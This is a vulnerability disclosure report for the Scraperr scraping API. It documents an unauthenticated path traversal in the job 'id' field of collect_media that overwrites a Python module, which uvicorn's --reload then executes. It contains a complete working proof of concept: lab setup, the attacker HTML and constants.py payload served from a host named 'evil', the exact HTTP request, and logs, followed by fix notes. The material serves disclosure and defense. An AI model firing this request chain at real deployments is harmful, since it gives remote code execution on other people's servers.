### Vulnerability details

**Official website / Product:** https://github.com/jaypyles/Scraperr / https://scraperr-docs.pages.dev/

**Repository:** jaypyles/Scraperr (stars at selection: 4910)

**Vulnerability type:** RCE / getshell (collect_media path traversal arbitrary file write → uvicorn --reload code exec)

**Vulnerability versions:** v1.1.7 / `jpyles0524/scraperr_api:latest` (commit `ee1e27ac1bfcac9d4ab3984836bdc5802ccfd1ef`, master at archive time)

**Vulnerability URL / Parameter:** `POST /api/submit-scrape-job` JSON fields `id` (path traversal) + `job_options.collect_media=true` + `url` (attacker-controlled page hosting overwrite payload as `<img src>`)

**Complex:** yes

### Verification procedure

1. Start the lab (original `labs/scraperr-r32-a8/` was cleaned after verify; images were also removed from this host. Rebuild with the same topology):
   - Services: `jpyles0524/scraperr_api:latest` (v1.1.7 / commit `ee1e27a`), container `scraperr-r32-a8-api`, host port **21208→8000**; sidecar `evil` on `python:3.12-alpine` serving the payload at `http://evil:8080/` on the compose network (container `scraperr-r32-a8-evil`).
   - Env: `RECORDINGS_ENABLED=false` (headless scrape still hits `collect_media`), `LOG_LEVEL=INFO`. **No credentials:** `POST /api/submit-scrape-job` has no auth dependency.
   - Equivalent compose (create a directory such as `labs/scraperr-r32-a8/`):

```yaml
services:
  scraperr_api:
    image: jpyles0524/scraperr_api:latest
    container_name: scraperr-r32-a8-api
    ports:
      - "21208:8000"
    environment:
      - RECORDINGS_ENABLED=false
      - LOG_LEVEL=INFO
    networks:
      - scraperr
  evil:
    image: python:3.12-alpine
    container_name: scraperr-r32-a8-evil
    working_dir: /evil
    volumes:
      - ./evil:/evil:ro
    command: ["python", "-m", "http.server", "8080"]
    networks:
      - scraperr
networks:
  scraperr:
```

2. Prepare the sidecar payload directory `evil/` (must match below, or `collect_media` will not write `constants.py` into the API tree):

`evil/index.html`:

```html
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>rce</title></head>
<body>
  <h1>rce payload</h1>
  <!-- collect_media downloads img[src]; basename becomes the on-disk filename -->
  <img src="/constants.py" alt="x">
</body>
</html>
```

`evil/constants.py` (writes the proof file on import and keeps constant names the API needs; includes `MEDIA_TYPES` etc. so StatReload can re-import cleanly):

```python
# overwritten via collect_media path traversal (r32-a8)
open("/tmp/r32a8-pwned", "w").write("RCE_OK_collect_media_afw\n")
from pathlib import Path
import os

DATABASE_URL = os.getenv("DATABASE_URL", "sqlite+aiosqlite:///data/database.db")
RECORDINGS_DIR = Path("media/recordings")
RECORDINGS_ENABLED = os.getenv("RECORDINGS_ENABLED", "true").lower() == "true"
MEDIA_DIR = Path("media")
MEDIA_TYPES = [
    "audio",
    "documents",
    "images",
    "pdfs",
    "presentations",
    "spreadsheets",
    "videos",
]
REGISTRATION_ENABLED = os.getenv("REGISTRATION_ENABLED", "true").lower() == "true"
DEFAULT_USER_EMAIL = os.getenv("DEFAULT_USER_EMAIL")
DEFAULT_USER_PASSWORD = os.getenv("DEFAULT_USER_PASSWORD")
DEFAULT_USER_FULL_NAME = os.getenv("DEFAULT_USER_FULL_NAME")
LOG_LEVEL = os.getenv("LOG_LEVEL", "INFO")
```

3. `docker compose up -d`; confirm port mapping and containers similar to:

```
NAME                   IMAGE                            STATUS         PORTS
scraperr-r32-a8-api    jpyles0524/scraperr_api:latest   Up             5900/tcp, 0.0.0.0:21208->8000/tcp
scraperr-r32-a8-evil   python:3.12-alpine               Up
```

and that the API container can resolve/fetch `http://evil:8080/`.

4. Send the complete HTTP request below (unauthenticated). `id` is `../../api/backend`, `collect_media=true`, `url` points at the sidecar.
5. Wait for the worker to scrape and for `collect_media` to run; observe log `Downloaded constants.py to media/images/../../api/backend/constants.py` and `StatReload detected changes in 'api/backend/constants.py'`.
6. Confirm the in-container proof file:

```bash
docker exec scraperr-r32-a8-api cat /tmp/r32a8-pwned
# expected: RCE_OK_collect_media_afw
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /api/submit-scrape-job HTTP/1.1
Host: 127.0.0.1:21208
User-Agent: r32-a8-poc/1.0
Accept: application/json
Content-Type: application/json
Content-Length: 274
Connection: close

{"id":"../../api/backend","url":"http://evil:8080/","elements":[{"name":"t","xpath":"//h1"}],"user":"","job_options":{"multi_page_scrape":false,"custom_headers":{},"proxies":[],"site_map":null,"collect_media":true,"custom_cookies":[],"return_html":false},"agent_mode":false}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
date: Mon, 02 Nov 2026 00:48:03 GMT
server: uvicorn
content-length: 66
content-type: application/json
Connection: close

{"id":"../../api/backend","message":"Job submitted successfully."}
```

Verification result notes (observed impact and key logs):

```
=== /tmp/r32a8-pwned ===
RCE_OK_collect_media_afw

=== constants.py head (start of overwritten file in container) ===
# overwritten via collect_media path traversal (r32-a8)
open("/tmp/r32a8-pwned","w").write("RCE_OK_collect_media_afw\n")
from pathlib import Path
import os
DATABASE_URL = os.getenv("DATABASE_URL", "sqlite+aiosqlite:///data/database.db")
RECORDINGS_DIR = Path("media/recordings")
RECORDINGS_ENABLED = os.getenv("RECORDINGS_ENABLED", "true").lower() == "true"
MEDIA_DIR = Path("media")

=== uvicorn / worker key logs ===
INFO:     ... - [Job] - Downloaded constants.py to media/images/../../api/backend/constants.py
WARNING:  StatReload detected changes in 'api/backend/constants.py'. Reloading...
INFO:     Shutting down
INFO:     Started server process [...]
INFO:     Application startup complete.
```

Worker downloaded attacker `constants.py` to `media/images/../../api/backend/constants.py` (i.e. `/project/app/api/backend/constants.py` inside the container). Uvicorn StatReload reloaded the app; import side-effect created `/tmp/r32a8-pwned` with `RCE_OK_collect_media_afw`.

### Vulnerability analysis

`POST /api/submit-scrape-job` does not require authentication and accepts a client-chosen `id`. When `job_options.collect_media` is true, `collect_media()` builds save paths as `media/<type>/<id>/<filename>` without normalizing or rejecting `..` segments. Filename comes from the scraped resource URL basename (e.g. `constants.py` via `<img src="/constants.py">`). After relative resolution: `media/images` + `../../api/backend` + `constants.py` → overwrites `/project/app/api/backend/constants.py`.

The official API image’s `supervisord.conf` starts uvicorn with `--reload`, so overwriting a watched `.py` module under `/project/app` yields immediate code execution on reload. Even without reload, the same AFW can plant other persistence artifacts; reload makes the getshell chain reliable on the shipped image.

This is **not** counting designed Playwright URL fetch alone: the security boundary failure is treating job `id` as a safe path component for writes.

Trigger / sink source (full path and line numbers):

```python
# File: api/backend/job/job_router.py
# Lines: 54-67
@job_router.post("/submit-scrape-job")
@handle_exceptions(logger=LOG)
async def submit_scrape_job(job: Job, db: AsyncSession = Depends(get_db)):
    LOG.info(f"Recieved job: {job}")

    if not job.id:
        job.id = uuid.uuid4().hex

    job_dict = job.model_dump()
    await insert(job_dict, db)

    return JSONResponse(
        content={"id": job.id, "message": "Job submitted successfully."}
    )
```

```python
# File: api/backend/job/scraping/collect_media.py
# Lines: 79-93
                        if not os.path.exists(media_dir / id):
                            os.makedirs(media_dir / id, exist_ok=True)

                        file_path = media_dir / id / f"{filename}"

                        async with session.get(url) as response:
                            response.raise_for_status()

                            with open(file_path, "wb") as f:
                                while True:
                                    chunk = await response.content.read(8192)
                                    if not chunk:
                                        break

                                    f.write(chunk)
```

```ini
# File: supervisord.conf
# Lines: 4-5 (enables StatReload chain)
[program:api]
command=pdm run python -m uvicorn api.backend.app:app --reload --host 0.0.0.0 --port 8000
```

### Fix notes

- Reject job `id` values that are not strict `[a-f0-9]{32}` (or similar) UUIDs; never accept user path segments.
- Resolve `file_path` with `Path.resolve()` and assert `file_path.is_relative_to(MEDIA_DIR.resolve())` before write.
- Do not run production uvicorn with `--reload`.
- Require authentication for job submission if the instance is network-exposed.
